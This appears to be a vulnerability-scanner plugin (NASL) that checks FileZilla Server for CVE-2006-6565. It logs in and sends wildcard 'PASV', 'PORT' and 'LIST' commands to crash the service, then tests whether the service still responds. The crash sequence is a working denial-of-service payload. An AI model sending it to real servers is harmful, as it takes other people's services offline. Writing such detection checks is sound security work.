# SPDX-FileCopyrightText: 2010 LSS
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

CPE = "cpe:/a:filezilla:filezilla_server";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.102019");
  script_version("2024-07-24T05:06:37+0000");
  script_tag(name:"last_modification", value:"2024-07-24 05:06:37 +0000 (Wed, 24 Jul 2024)");
  script_tag(name:"creation_date", value:"2010-04-02 10:10:27 +0200 (Fri, 02 Apr 2010)");
  script_tag(name:"cvss_base", value:"4.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:N/I:N/A:P");
  script_cve_id("CVE-2006-6565");
  script_name("FileZilla Server < 0.9.22 'Port Command' DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 LSS");
  script_family("FTP");
  script_dependencies("gb_filezilla_server_ftp_detect.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("filezilla/server/ftp/detected", "ftp/login", "ftp/password");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/21542");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/21549");

  script_tag(name:"summary", value:"FileZilla Server is prone to a denial of service (DoS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted FTP request and checks if the service is still
  reachable afterwards.");

  script_tag(name:"insight", value:"The falw allows remote attackers to cause a denial of service
  (crash) via a wildcard argument to the (1) LIST or (2) NLST commands, which results in a NULL
  pointer dereference, a different set of vectors than CVE-2006-6564.

  NOTE: CVE analysis suggests that the problem might be due to a malformed PORT command.");

  script_tag(name:"affected", value:"FileZilla Server versions prior to 0.9.32.");

  script_tag(name:"solution", value:"Update to version 0.9.32 or later.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"ftp"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

kb_creds = ftp_get_kb_creds();

if(!user = kb_creds["login"])
  exit(0);

if(!pass = kb_creds["pass"])
  exit(0);

attack = "A*";

if(!soc = open_sock_tcp(port))
  exit(0);

is_alive = ftp_recv_line(socket:soc);
if(!is_alive) {
  close(soc);
  exit(0);
}

###################
###step 1: login###
###################

cmd = "USER " + user;
ftp_send_cmd(socket:soc, cmd:cmd);

cmd = "PASS " + pass;
ftp_send_cmd(socket:soc, cmd:cmd);

########################
###step 2: the attack###
########################

cmd = "PASV " + attack;
ftp_send_cmd(socket:soc, cmd:cmd);

cmd = "PORT " + attack;
ftp_send_cmd(socket:soc, cmd:cmd);

cmd = "LIST " + attack;
ftp_send_cmd(socket:soc, cmd:cmd);

###############################
###step 3: attack succeeded?###
###############################

close(soc);

sleep(5);

soc1 = open_sock_tcp(port);
if(soc1) {
  is_alive = ftp_recv_line(socket:soc1);
  close(soc1);
}

if(!is_alive) {
  security_message(port:port);
  exit(0);
}

exit(99);
